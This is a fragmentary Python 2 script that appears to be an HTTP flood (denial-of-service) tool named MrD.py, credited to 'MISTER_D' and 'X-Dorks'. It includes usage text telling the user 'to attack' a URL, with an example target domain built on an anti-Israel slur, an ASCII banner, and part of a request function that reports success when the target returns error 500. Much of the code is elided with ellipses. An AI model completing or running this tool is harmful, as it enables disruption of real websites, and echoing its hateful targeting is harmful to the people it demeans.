...
def usage():
	print '---------------------------------------------------'
	print 'to attack:'
        print '#Windows: MrD.py http://www.israelfuck.com'
        print '#Linux: python MrD.py http://www.israelfuck.com'
	print "\a"
print \
"""                          
              /$$$$$$$$ /$$$$$$   /$$$$$$         /$$$$$$    /$$      /$$$$$$  /$$   /$$
   ...
   |     /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$    |
              ...
              |    | $$  | $$   | $$      | $$   | $$         |
              |    |__/  |__/   |__/      |__/   |__/         |
              |_____________________________________[X-Dorks] |
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print 'MISTER_D > A GREAT DUET ATTACK < X-DORKS'
			code=500
